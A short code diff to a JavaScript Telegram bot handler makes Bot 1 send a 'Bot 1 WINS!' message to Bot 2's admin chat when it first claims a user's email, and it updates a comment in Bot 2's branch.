@@ -396,7 +396,15 @@ bot.on("callback_query", async (query) => {
       botsThatClickedPage1[`${email}_timestamp`] = Date.now();
       
       console.log(`🏆 User ${email} - Telegram 1 WINS!`);
-      // ✅ NO NOTIFICATION to loser (Bot 2) - this is intentional
+      
+      // Send notification to Bot 2 (loser)
+      if (bot2 && ADMIN_CHAT_ID_2) {
+        try {
+          await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`, { parse_mode: "HTML" });
+        } catch (err) {
+          console.error("Error sending loser notification:", err);
+        }
+      }
     }
 
     // ============================================================================
@@ -551,7 +559,7 @@ if (bot2) {
         botsThatClickedPage1[`${email}_timestamp`] = Date.now();
         
         console.log(`🏆 User ${email} - Telegram 2 WINS!`);
-        // ✅ NO NOTIFICATION to loser (Bot 1) - this is intentional
+        // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
       }
 
       // ============================================================================
